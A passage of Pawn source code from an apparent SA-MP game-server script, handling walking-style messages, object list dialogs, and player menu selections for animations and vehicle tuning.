					case 2: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Normal (Woman 1)\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 3: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Normal (Woman 2)\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 4: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Drunk\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 5: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Gangsta 1\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 6: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Gangsta 2\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 7: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Fat\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 8: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Fat & old 1\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 9: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Fat & old 2\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 10: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Old 1\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 11: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Old 2\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 12: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Old (Shuffle)\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 13: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Blind\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 14: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Whore 1\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 15: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Whore 2\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 16: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Stranger\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 17: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Defensive\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 18: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Angry\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 19: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Sneaking (Slow)\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 20: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Sneaking (Fast)\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 21: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Armed 1 (Shotgun)\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 22: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Armed 2 (Shotgun)\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 23: SendServerMessage(playerid, EMBED_IVORY, "Walking style set to \"Armed 3 (Chainsaw)\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
					case 24: SendServerMessage(playerid, EMBED_IVORY, "Walkin styleg set to \"Armed 4 (RPG)\". (Press "EMBED_RED"~k~~SNEAK_ABOUT~"EMBED_IVORY" to start walking)");
				}
				return 1;
	        }
		}
		
		default: return 0; // end CASE switches
    }
    return 0;
}

ShowPlayerStickyObjectsList(playerid)
{
	new strList[391],
		StickyStatus[4],
		StickyStatus2[4];

	strList = ""EMBED_LIME"Item\tModel\tX\tY\tZ\trX\trY\trZ\tAtt?\tVeh?{FFFFFF}\n";
	for (new i = 0; i < VIP_MAX_OSTICKS; i++)
	{
	    if (pSObject[playerid][i][so_model] != -1)
	    {
			if (pSObject[playerid][i][so_object] == -1) StickyStatus = "No"; else StickyStatus = "Yes";
			if (pSObject[playerid][i][so_isvehicle] == 0) StickyStatus2 = "No"; else StickyStatus2 = "Yes";

			format(strList, sizeof(strList), "%s%d\t%d\t%0.2f\t%0.2f\t%0.2f\t%0.2f\t%0.2f\t%0.2f\t%s\t%s\n", strList, i+1, pSObject[playerid][i][so_model], pSObject[playerid][i][so_x], pSObject[playerid][i][so_y], pSObject[playerid][i][so_z], pSObject[playerid][i][so_rx], pSObject[playerid][i][so_ry], pSObject[playerid][i][so_rz], StickyStatus, StickyStatus2);
		}
	}
	ShowPlayerDialog(playerid, DIALOGID_OSTICKS, DIALOG_STYLE_LIST, "List of sticky objects", strList, "Edit", "Close");
	return 1;
}

ShowPlayerAttachedObjectsList(playerid)
{
	new strList[874],
		AttachStatus[4];

	strList = ""EMBED_LIME"Item\tModel\tBone\tX\tY\tZ\trX\trY\trZ\tAtt?{FFFFFF}\n";
	for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
	{
	    if (pAObject[playerid][pi][ao_model] == -1)
	    {
			format(strList, sizeof(strList), "%s%d\t0\t0\t0.00\t0.00\t0.00\t0.00\t0.00\t0.00\tNo\n", strList, pi+1);
	    } else {
			if (!IsPlayerAttachedObjectSlotUsed(playerid, pi)) AttachStatus = "No"; else AttachStatus = "Yes";

			format(strList, sizeof(strList), "%s%d\t%d\t%d\t%0.2f\t%0.2f\t%0.2f\t%0.2f\t%0.2f\t%0.2f\t%s\n", strList, pi+1, pAObject[playerid][pi][ao_model], pAObject[playerid][pi][ao_bone], pAObject[playerid][pi][ao_x], pAObject[playerid][pi][ao_y], pAObject[playerid][pi][ao_z], pAObject[playerid][pi][ao_rx], pAObject[playerid][pi][ao_ry], pAObject[playerid][pi][ao_rz], AttachStatus);
		}
	}
	ShowPlayerDialog(playerid, DIALOGID_POSTICKS, DIALOG_STYLE_LIST, "List of attached objects", strList, "Edit", "Close");
	return 1;
}

public OnPlayerSelectedMenuRow(playerid, row)
{
    //printf("\r\n[DEBUG-STUNTA] OnPlayerSelectedMenuRow(%d, %d)", playerid, row);

    new Menu:Current = GetPlayerMenu(playerid),
		vID;

	if (Current == ActionMenu) {
  	switch(row) {
	case 0: {
	        SendClientMessage(playerid, COLOR_GREENYELLOW, "You can also use skate with /skate");
	        ShowMenuForPlayer(SkateMenu,playerid);
		 	}
 	case 1: {
		 	SendClientMessage(playerid, COLOR_GREENYELLOW, "You can also use swim with /swim");
 	        ShowMenuForPlayer(SwimMenu,playerid);
		 	}
 	case 2: {
 			ShowMenuForPlayer(DanceMenu1,playerid);
	 		}
 	case 3: {
 			ShowMenuForPlayer(StripMenu1,playerid);
	 		}
 	case 4: {
 			TogglePlayerControllable(playerid, 1);
 			ApplyAnimation(playerid, "PED", "WALK_DRUNK", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 5: {
 			ShowMenuForPlayer(FuckyouMenu,playerid);
		 	}
 	case 6: {
 			ShowMenuForPlayer(HandsupMenu,playerid);
		 	}
 	case 7: {
 			ShowMenuForPlayer(SmokeMenu,playerid);
		 	}
 	case 8: {
 	        ShowMenuForPlayer(WeirdMenu,playerid);
		 	}
 	case 9: {
 	        HideMenuForPlayer(ActionMenu, playerid);
			TogglePlayerControllable(playerid, 1);
		 	}
 		}
 	}
	else if (Current == SkateMenu) {
  	switch(row) {
 	case 0: {
 			TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "SKATE", "skate_run", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 1: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "SKATE", "skate_sprint", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 2: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "SKATE", "skate_idle", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 3: {
		 	TogglePlayerControllable(playerid, 1);
	 		HideMenuForPlayer(SkateMenu,playerid);
	 		}
		}
	}
	else if (Current == SwimMenu) {
  	switch(row) {
 	case 0: {
 			TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "SWIM", "Swim_Breast", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 1: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "SWIM", "SWIM_crawl", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 2: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "SWIM", "Swim_Glide", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 3: {
		 	TogglePlayerControllable(playerid, 1);
	 		HideMenuForPlayer(SwimMenu,playerid);
	 		}
		}
	}
	else if (Current == DanceMenu1) {
  	switch(row) {
 	case 0: {
 			TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "DANCING", "bd_clap", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 1: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "DANCING", "bd_clap1", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 2: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "DANCING", "dance_loop", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 3: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "DANCING", "DAN_Down_A", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 4: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "DANCING", "DAN_Left_A", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 5: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "DANCING", "DAN_Loop_A", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 6: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "DANCING", "DAN_Right_A", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 7: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "DANCING", "DAN_Up_A", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 8: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "DANCING", "dnce_M_a", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
    case 9: {
 			HideMenuForPlayer(DanceMenu1,playerid);
 			ShowMenuForPlayer(DanceMenu2,playerid);
	 		}
		}
	}
	else if (Current == DanceMenu2) {
  	switch(row) {
  	case 0: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "DANCING", "dnce_M_b", 4.1, 1, 1, 1, 1, 1, 1);
  	        }
 	case 1: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "DANCING", "dnce_M_c", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 2: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "DANCING", "dnce_M_d", 4.1, 1, 1, 1, 1, 1, 1);
		 	}
 	case 3: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "DANCING", "dnce_M_e", 4.1, 1, 1, 1, 1, 1, 1);
		 	}
 	case 4: {
			TogglePlayerControllable(playerid, 1);
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
		 	}
 	case 5: {
			TogglePlayerControllable(playerid, 1);
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
		 	}
 	case 6: {
			TogglePlayerControllable(playerid, 1);
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
		 	}
 	case 7: {
 			TogglePlayerControllable(playerid, 1);
			HideMenuForPlayer(DanceMenu2,playerid);
		 	}
		}
	}
	else if (Current == StripMenu1) {
  	switch(row) {
 	case 0: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "PUN_CASH",4.1,0,1,1,1,1);
	 		}
 	case 1: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "PUN_HOLLER",4.1,0,1,1,1,1);
		 	}
 	case 2: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "PUN_LOOP", 4.1, 1, 1, 1, 1, 1, 1);
		 	}
 	case 3: {
 			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "strip_A", 4.1, 1, 1, 1, 1, 1, 1);
		 	}
 	case 4: {
 			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "strip_B", 4.1, 1, 1, 1, 1, 1, 1);
		 	}
 	case 5: {
 			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "strip_C", 4.1, 1, 1, 1, 1, 1, 1);
		 	}
 	case 6: {
 			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "strip_D", 4.1, 1, 1, 1, 1, 1, 1);
		 	}
 	case 7: {
 			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "strip_E",4.1,0,1,1,1,1);
		 	}
   	case 8: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "STRIP", "strip_F", 4.1, 1, 1, 1, 1, 1, 1);
  	        }
 	case 9: {
			HideMenuForPlayer(StripMenu1,playerid);
 			ShowMenuForPlayer(StripMenu2,playerid);
		 	}
		}
	}
	else if (Current == StripMenu2) {
  	switch(row) {
 	case 0: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "strip_G", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 1: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "STR_A2B",4.1,0,1,1,1,1);
		 	}
 	case 2: {
 			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "STR_B2C",4.1,0,1,1,1,1);
		 	}
   	case 3: {
 			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "STR_C1",4.1,0,1,1,1,1);
		 	}
   	case 4: {
 			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "STR_C2",4.1,0,1,1,1,1);
		 	}
   	case 5: {
 			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "STR_C2B",4.1,0,1,1,1,1);
		 	}
   	case 6: {
 			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "STR_Loop_A", 4.1, 1, 1, 1, 1, 1, 1);
		 	}
   	case 7: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "STRIP", "STR_Loop_B",4.1,0,1,1,1,1);
  	        }
   	case 8: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "STRIP", "STR_Loop_C",4.1,0,1,1,1,1);
	 		}
   	case 9: {
			TogglePlayerControllable(playerid, 1);
			HideMenuForPlayer(StripMenu2,playerid);
		 	}
		}
	}
	else if (Current == FuckyouMenu) {
  	switch(row) {
 	case 0: {
 			TogglePlayerControllable(playerid, 1);
 	        ApplyAnimation(playerid, "RIOT", "RIOT_FUKU",4.1,0,1,1,1,1);
	 		}
 	case 1: {
		 	TogglePlayerControllable(playerid, 1);
 			ApplyAnimation(playerid, "PED", "fucku",4.1,0,1,1,1,1);
	 		}
 	case 2: {
 			TogglePlayerControllable(playerid, 1);
 			HideMenuForPlayer(FuckyouMenu,playerid);
		 	}
 		}
 	}
	else if (Current == HandsupMenu) {
  	switch(row) {
 	case 0: {
 			TogglePlayerControllable(playerid, 1);
 	        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
	 		}
 	case 1: {
		 	TogglePlayerControllable(playerid, 1);
 	        ApplyAnimation(playerid, "ROB_BANK", "SHP_HandsUp_Scr",4.1,0,1,1,1,1);
		 	}
 	case 2: {
 			TogglePlayerControllable(playerid, 1);
 	        HideMenuForPlayer(HandsupMenu,playerid);
		 	}
 		}
 	}
	else if (Current == SmokeMenu) {
  	switch(row) {
  	case 0: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "JST_BUISNESS", "smoke_01",4.1,0,1,1,1,1);
  	        }
 	case 1: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "SHOP", "Smoke_RYD", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 2: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "PED", "Smoke_in_car", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 3: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "PED", "pass_Smoke_in_car", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 4: {
 			TogglePlayerControllable(playerid, 1);
			HideMenuForPlayer(SmokeMenu,playerid);
		 	}
		}
	}
	else if (Current == WeirdMenu) {
  	switch(row) {
  	case 0: {
		 	TogglePlayerControllable(playerid, 1);
	 		ApplyAnimation(playerid, "PARACHUTE", "PARA_decel_O", 4.1, 1, 1, 1, 1, 1, 1);
  	        }
 	case 1: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "PARACHUTE", "PARA_Land_O", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 2: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "PARACHUTE", "PARA_Land_Water_O", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 3: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "PARACHUTE", "PARA_Rip_Land_O", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
   	case 4: {
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "PARACHUTE", "PARA_Rip_Loop_O", 4.1, 1, 1, 1, 1, 1, 1);
	 		}
 	case 5: {
 			TogglePlayerControllable(playerid, 1);
			HideMenuForPlayer(WeirdMenu,playerid);
		 	}
		}
	}
	else if (Current == TuningMenu) {
 	vID = GetPlayerVehicleID(playerid);
	SetCameraBehindPlayer(playerid);
  	switch(row) {
  	case 0: {
			GetVehiclePos( vID, playerxyza[0], playerxyza[1], playerxyza[2]);
			GetVehicleZAngle( vID, playerxyza[3]);
			playerxyza[0] += (5.5 * floatsin(-playerxyza[3] +90, degrees));
			playerxyza[1] += (5.5 * floatcos(-playerxyza[3] +90, degrees));
   			SetPlayerCameraPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]+2.5);
   			GetVehiclePos( vID, playerxyza[0], playerxyza[1], playerxyza[2]);
   			SetPlayerCameraLookAt(playerid, playerxyza[0], playerxyza[1], playerxyza[2] );
   			ShowMenuForPlayer(SCMenu,playerid);
            player[playerid][tunecam] = 1;
			}
   	case 1: {
 			GetVehiclePos( vID, playerxyza[0], playerxyza[1], playerxyza[2]);
			GetVehicleZAngle( vID, playerxyza[3]);
			playerxyza[0] += (5.5 * floatsin(-playerxyza[3] +90, degrees));
			playerxyza[1] += (5.5 * floatcos(-playerxyza[3] +90, degrees));
   			SetPlayerCameraPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]+2.5);
   			GetVehiclePos( vID, playerxyza[0], playerxyza[1], playerxyza[2]);
   			SetPlayerCameraLookAt(playerid, playerxyza[0], playerxyza[1], playerxyza[2] );
   			ShowMenuForPlayer(TC1Menu,playerid);
   			player[playerid][tunecam] = 1;
			}
   	case 2: {
			/*if (!TunableVehicles( vID ))
   			{
				ShowMenuForPlayer(TuningMenu,playerid);
				return SendClientMessage(playerid, COLOR_IVORY, "This vehicle doesn't support nitro");
 			} else {*/
				ShowMenuForPlayer(NMenu,playerid);
		 	//}
			}
   	case 3: {
  	        /*if (!TunableVehicles( vID ))
  	        {
	  	        ShowMenuForPlayer(TuningMenu,playerid);
				SendClientMessage(playerid, COLOR_IVORY, "This vehicle doesn't support custom wheels");
				return 1;
    		} else {*/
	            GetVehiclePos( vID, playerxyza[0], playerxyza[1], playerxyza[2]);
 				GetVehicleZAngle( vID, playerxyza[3]);
				playerxyza[0] += (5.5 * floatsin(-playerxyza[3] +90, degrees));
				playerxyza[1] += (5.5 * floatcos(-playerxyza[3] +90, degrees));
	            SetPlayerCameraPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	            GetVehiclePos( vID, playerxyza[0], playerxyza[1], playerxyza[2]);
	            SetPlayerCameraLookAt(playerid, playerxyza[0], playerxyza[1], playerxyza[2] );
	            ShowMenuForPlayer(WMenu,playerid);
	            player[playerid][tunecam] = 1;
			//}
			}
  	case 4: {
			/*if (!TunableVehicles( vID ))
   			{
				ShowMenuForPlayer(TuningMenu,playerid);
				SendClientMessage(playerid, COLOR_IVORY, "This vehicle doesn't support hydraulics");
				return 1;
 			} else {*/
				AddVehicleComponent( vID, 1087);
				ShowMenuForPlayer(TuningMenu,playerid);
			//}
			}
  	case 5: {
  	        /*if (!PaintjobVehicles( vID ))
  	        {
	  	        ShowMenuForPlayer(TuningMenu,playerid);
				SendClientMessage(playerid, COLOR_IVORY, "This vehicle doesn't support paintjobs");
				return 1;
	        } else {*/
    			GetVehiclePos( vID, playerxyza[0], playerxyza[1], playerxyza[2]);
 				GetVehicleZAngle( vID, playerxyza[3]);
				playerxyza[0] += (5.5 * floatsin(-playerxyza[3] +90, degrees));
				playerxyza[1] += (5.5 * floatcos(-playerxyza[3] +90, degrees));
	            SetPlayerCameraPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]+2.5);
	            GetVehiclePos( vID, playerxyza[0], playerxyza[1], playerxyza[2]);
	            SetPlayerCameraLookAt(playerid, playerxyza[0], playerxyza[1], playerxyza[2] );
	            ShowMenuForPlayer(PMenu,playerid);
	            player[playerid][tunecam] = 1;
			//}
			}
	case 6: {
				AddVehicleComponent( vID, 1086);
				ShowMenuForPlayer(TuningMenu,playerid);
			}
  	case 7: {
			TogglePlayerControllable(playerid, 1);
			SetPlayerPos(playerid, 0, 0, 1);
  			PutPlayerInVehicle(playerid, vID, 0);
  			SetCameraBehindPlayer(playerid);
			HideMenuForPlayer(TuningMenu,playerid);
			player[playerid][tunecam] = 0;
			}
		}
	}
	else if (Current == SCMenu) {
 	vID = GetPlayerVehicleID(playerid);
  	switch(row) {
  	case 0: {
  	        ChangeVehicleColor( vID ,1,1);
  	        ShowMenuForPlayer(SCMenu,playerid);
			}
   	case 1: {
   	        ChangeVehicleColor( vID ,6,6);
   	        ShowMenuForPlayer(SCMenu,playerid);
			}
   	case 2: {
   	        ChangeVehicleColor( vID ,126,126);
   	        ShowMenuForPlayer(SCMenu,playerid);
			}
  	case 3: {
			ChangeVehicleColor( vID ,17,17);
			ShowMenuForPlayer(SCMenu,playerid);
			}
   	case 4: {
            ChangeVehicleColor( vID ,86,86);
            ShowMenuForPlayer(SCMenu,playerid);
			}
  	case 5: {
            ChangeVehicleColor( vID ,5,5);
            ShowMenuForPlayer(SCMenu,playerid);
			}
   	case 6: {
            ChangeVehicleColor( vID ,53,53);
            ShowMenuForPlayer(SCMenu,playerid);
			}
  	case 7: {
            ChangeVehicleColor( vID ,34,34);
            ShowMenuForPlayer(SCMenu,playerid);
			}
   	case 8: {
            ChangeVehicleColor( vID ,0,0);
            ShowMenuForPlayer(SCMenu,playerid);
            }
   	case 9: {
 			SetPlayerPos(playerid, 0, 0, 1);
  			PutPlayerInVehicle(playerid, vID, 0);
  			SetCameraBehindPlayer(playerid);
			ShowMenuForPlayer(TuningMenu,playerid);
			player[playerid][tunecam] = 0;
			}
		}
	}
	else if (Current == TC1Menu) {
 	vID = GetPlayerVehicleID(playerid);
  	switch(row) {
  	case 0: {
  			ChangeVehicleColor( vID ,1,0);
  	        player[playerid][vehiclecolor1] = 1;
  	        ShowMenuForPlayer(TC2Menu,playerid);
			}
   	case 1: {
   	        ChangeVehicleColor( vID ,6,0);
   	        player[playerid][vehiclecolor1] = 6;
   	        ShowMenuForPlayer(TC2Menu,playerid);
			}
   	case 2: {
   	        ChangeVehicleColor( vID ,126,0);
   	        player[playerid][vehiclecolor1] = 126;
   	        ShowMenuForPlayer(TC2Menu,playerid);
			}
  	case 3: {
			ChangeVehicleColor( vID ,17,0);
			player[playerid][vehiclecolor1] = 17;
			ShowMenuForPlayer(TC2Menu,playerid);
			}
   	case 4: {
            ChangeVehicleColor( vID ,86,0);
			player[playerid][vehiclecolor1] = 86;
            ShowMenuForPlayer(TC2Menu,playerid);
			}
  	case 5: {
            ChangeVehicleColor( vID ,5,0);
			player[playerid][vehiclecolor1] = 5;
            ShowMenuForPlayer(TC2Menu,playerid);
			}
   	case 6: {
            ChangeVehicleColor( vID ,53,0);
			player[playerid][vehiclecolor1] = 53;
            ShowMenuForPlayer(TC2Menu,playerid);
			}
  	case 7: {
            ChangeVehicleColor( vID ,34,0);
			player[playerid][vehiclecolor1] = 34;
            ShowMenuForPlayer(TC2Menu,playerid);
			}
   	case 8: {
            ChangeVehicleColor( vID ,0,0);
			player[playerid][vehiclecolor1] = 0;
            ShowMenuForPlayer(TC2Menu,playerid);
            }
   	case 9: {
 			SetPlayerPos(playerid, 0, 0, 1);
  			PutPlayerInVehicle(playerid, vID, 0);
  			SetCameraBehindPlayer(playerid);
			ShowMenuForPlayer(TuningMenu,playerid);
			player[playerid][tunecam] = 0;
			}
		}
	}
	else if (Current == TC2Menu) {
 	vID = GetPlayerVehicleID(playerid);
  	switch(row) {
  	case 0: {
  	        ChangeVehicleColor( vID ,player[playerid][vehiclecolor1] ,1);
  	        ShowMenuForPlayer(TuningMenu,playerid);
			}
   	case 1: {
   	        ChangeVehicleColor( vID ,player[playerid][vehiclecolor1] ,6);
   	        ShowMenuForPlayer(TuningMenu,playerid);
			}
   	case 2: {
   	        ChangeVehicleColor( vID ,player[playerid][vehiclecolor1] ,126);
   	        ShowMenuForPlayer(TuningMenu,playerid);
			}
  	case 3: {
			ChangeVehicleColor( vID ,player[playerid][vehiclecolor1] ,17);
			ShowMenuForPlayer(TuningMenu,playerid);
			}
   	case 4: {
            ChangeVehicleColor( vID ,player[playerid][vehiclecolor1] ,86);
            ShowMenuForPlayer(TuningMenu,playerid);
			}
  	case 5: {
            ChangeVehicleColor( vID ,player[playerid][vehiclecolor1] ,5);
            ShowMenuForPlayer(TuningMenu,playerid);
			}
   	case 6: {
            ChangeVehicleColor( vID ,player[playerid][vehiclecolor1] ,53);
            ShowMenuForPlayer(TuningMenu,playerid);
			}
  	case 7: {
            ChangeVehicleColor( vID ,player[playerid][vehiclecolor1] ,34);
            ShowMenuForPlayer(TuningMenu,playerid);
			}
   	case 8: {
            ChangeVehicleColor( vID ,player[playerid][vehiclecolor1] ,0);
            ShowMenuForPlayer(TuningMenu,playerid);
            }
   	case 9: {
   	        ShowMenuForPlayer(TC1Menu,playerid);
			}
		}
	}
	else if (Current == NMenu) {

 	vID = GetPlayerVehicleID(playerid);
	/*if (!TunableVehicles( vID ))
	{
		ShowMenuForPlayer(TuningMenu,playerid);
		return SendClientMessage(playerid, COLOR_IVORY, "This vehicle doesn't support nitro");
	}*/

  	switch(row) {
  	case 0: {
  	        AddVehicleComponent( vID , 1009);
  	        ShowMenuForPlayer(TuningMenu,playerid);
			}
   	case 1: {
   	        AddVehicleComponent( vID , 1008);
   	        ShowMenuForPlayer(TuningMenu,playerid);
			}
   	case 2: {
   	        AddVehicleComponent( vID , 1010);
   	        ShowMenuForPlayer(TuningMenu,playerid);
			}
   	case 3: {
   	        ShowMenuForPlayer(TuningMenu,playerid);
			}
		}
	}
	else if (Current == WMenu) {

 	vID = GetPlayerVehicleID(playerid);
  	/*if (!TunableVehicles( vID ))
	{
 		ShowMenuForPlayer(TuningMenu,playerid);
		SendClientMessage(playerid, COLOR_IVORY, "This vehicle doesn't support custom wheels");
		return 1;
	}*/

  	switch(row) {
  	case 0: {
  	        AddVehicleComponent( vID , 1025);
  	        ShowMenuForPlayer(WMenu,playerid);
			}
   	case 1: {
   	        AddVehicleComponent( vID , 1073);
   	        ShowMenuForPlayer(WMenu,playerid);
			}
   	case 2: {
   	        AddVehicleComponent( vID , 1074);
   	        ShowMenuForPlayer(WMenu,playerid);
			}
  	case 3: {
			AddVehicleComponent( vID , 1075);
			ShowMenuForPlayer(WMenu,playerid);
			}
   	case 4: {
            AddVehicleComponent( vID , 1076);
            ShowMenuForPlayer(WMenu,playerid);
			}
  	case 5: {
            AddVehicleComponent( vID , 1077);
            ShowMenuForPlayer(WMenu,playerid);
			}
   	case 6: {
            AddVehicleComponent( vID , 1078);
            ShowMenuForPlayer(WMenu,playerid);
			}
  	case 7: {
            AddVehicleComponent( vID , 1079);
            ShowMenuForPlayer(WMenu,playerid);
			}
   	case 8: {
            ShowMenuForPlayer(W2Menu,playerid);
            }
   	case 9: {
  			/*SetPlayerPos(playerid, 0, 0, 1);
  			PutPlayerInVehicle(playerid, vID, 0);*/
  			SetCameraBehindPlayer(playerid);
			ShowMenuForPlayer(TuningMenu,playerid);
			player[playerid][tunecam] = 0;
			}
		}
	}
	else if (Current == W2Menu) {

